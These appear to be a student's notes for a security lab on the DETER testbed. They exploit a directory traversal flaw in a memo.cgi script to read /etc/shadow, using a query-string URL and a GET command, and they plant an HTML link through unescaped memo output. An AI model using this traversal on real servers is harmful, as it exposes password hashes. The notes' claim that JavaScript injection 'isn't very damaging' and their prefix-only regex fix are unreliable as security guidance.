Filesystem Exploits Tasks

	Load your Exploits image in DETER. (You don't need to reload it if it is already active.)
	Find the directory traversal vulnerability in the memo.cgi code.
	The sourcecode is located at /var/www/cgi-bin/memo.cgi
	If you have set up ssh tunneling via port 8080 (a good idea), the memo application can be accessed at http://localhost:8080/cgi-bin/memo.cgi
	Exercise a remote vulnerability in memo.cgi to read the private file /etc/shadow
	Create an executable program demonstrating your exploit. Your program should display or save /etc/shadow. We've created a skeleton exploit script in /root/exploit2.sh. Edit it with your favorite text editor.
	Fix the flaw and create a patch of your new code against the original. Your fix should add input validation and make memo.cgi non SUID-root.
	This will force you to redesign the application's back end, such as moving directories, changing permissions, creating groups, possibly changing how or where users create/edit memos, etc., but should not change the appearance or general function of the application.
	Users should not be able to delete each others' memos, but the memos themselves are not private.
	Write a ~1 page memo:
	describe the security flaw you found, how you fixed it, and how your demo exploit works. The memo itself should quote as little sourcecode as possible; for longer sections, refer to filenames and line numbers in the original or your attached source.
	Considering memo.cgi alone, include in your memo:
	A recovery plan for the server, answering: How serious was this breach? What should be done with the server in order to secure it?
	An explanation of why it is not sufficient to simply make sure that the pathnames start with /home/username/memo/ or /root/memo/
	Any other observations or thoughts you might have.
	Store the following files in /root/part2:
	your memo
	your working demo with instructions
	your patch
	Use the scripts described in the section for creating a submission tarball.


	Logon to ssh tunnel

	sudo su -
	apt-get install gdb
	cd /./usr/src/fhttpd/server
	gdb webserver

	open browser
	http://localhost:8118/cgi-bin/memo.cgi?memo=/etc/shadow

	Add this text to exploit2.sh
	
	GET localhost/cgi-bin/memo.cgi?memo=/etc/shadow > shadow.txt

	Execute
	
	sh exploit2.sh
	
	open the new file shadow.txt
	
	cd /./home/wilbar/memo
	
	Create the hack file, then copy it to the part 2 folder
	
	cp hack /./users/nv8476am/exploits/part2
	
	Update the memo.cgi with the fix and copy it to the part2 folder
	
	cd /./usr/lib/cgi-bin
	cp memo.cgi /./users/nv8476am/exploits/part2
	
	After updating memo.cgi, update the webserver
	
	cd /./usr/src/fhttpd
	sudo make
	cd /./usr/src/fhttpd/server
	gdb webserver
	
	::Run on cmd.exe to copy part 2 to local directory
	"C:\Program Files (x86)\Putty\pscp.exe" "nv8476am@users.deterlab.net:/users/nv8476am/exploits/part2/*" "C:\Users\thoma_000\Documents\Grad School\Cryptography\Lab 2\part2"
	::Run on cmd.exe to copy part 2 from local directory
	"C:\Program Files (x86)\Putty\pscp.exe" "C:\Users\thoma_000\Documents\Grad School\Cryptography\Lab 2\part2\*" "nv8476am@users.deterlab.net:/users/nv8476am/exploits/part2"
	
	

	The weakness in the webserver was that the input wasn't validated at all. The result is that when the selected "memo" path was "/etc/shadow", it would show the shadow file. If the user only accessed the memo files as they were supposed to access them, then there wouldn't be a problem. The only memos shown in the dropdown are files in the "/root/memo" folder or the "/home/*/memo" folder (replace the * with the username for the author of the file). However, you can easily circumvent this by typing in the "memo" field as a query string. Instead of "http://localhost:8118/cgi-bin/memo.cgi" type "http://localhost:8118/cgi-bin/memo.cgi?memo=/etc/shadow" into a browser's address bar.
	I implemented this hack in two different ways.
		In "exploit2.sh" I added the command 
			GET localhost/cgi-bin/memo.cgi?memo=/etc/shadow > shadow.txt
		This command copied the contents of the hacked address into the included "shadow.txt" file.

		The other method that I implemented the hack in is a little more crafty. There was another weakness with the memo function that could be exploited. The contents of the memo were not encoded for html, so you can add code for html elements. In this particular method, I created the "hack" memo file and added the text
			<a href="http://localhost:8118/cgi-bin/memo.cgi?memo=/etc/shadow" target="_blank">See shadow file</a>
		This command adds an html link to the page "http://localhost:8118/cgi-bin/memo.cgi?memo=/etc/shadow". simply select "hack" from the dropdown to populate the contents of the textbox where the memo is normally stored with a link. I did not bother fixing this weakness, as it did not, by itself, lead to a filepath hack. This hack should be fixed to avoid an internal attack executing unwanted javascript. Javascript isn't very damaging, so it really isn't an issue, but if I was writing the site professionally, I would encode the html.

	To fix the error, I regular expressions to detect if the file was in the proper form. The valid memos would have to be in the "/root/memo" or "/home/*/memo" folders. If the filepath was not in one of those two forms, I changed the output to only be "Invalid Input." This patch will prevent any memos from being displayed. This language that the cgi file was written in seems to be Perl.